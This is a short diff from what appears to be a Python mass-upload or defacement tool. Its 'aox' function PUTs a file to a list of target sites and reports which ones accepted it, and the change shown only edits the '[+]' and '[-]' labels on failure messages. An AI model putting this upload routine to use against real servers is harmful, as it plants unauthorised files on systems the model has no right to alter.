@@ -74,11 +74,11 @@ def aox(script, target_url):
             site = "http://" + site
         req = s.put(site + "/" + script, data=op)
         if req.status_code > 200 or req.status_code >= 250:
-            print(m + ">" + b + "[+] FAILED" + b + " %s/%s" % (site, script))
+            print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, script))
         else:
             print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, script))
     except requests.exceptions.RequestException:
-        print(m + ">" + b + "[+] FAILED" + b + " %s" % target_url)
+        print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)
 
 def find_links(html_content):
     soup = BeautifulSoup(html_content, 'html.parser')
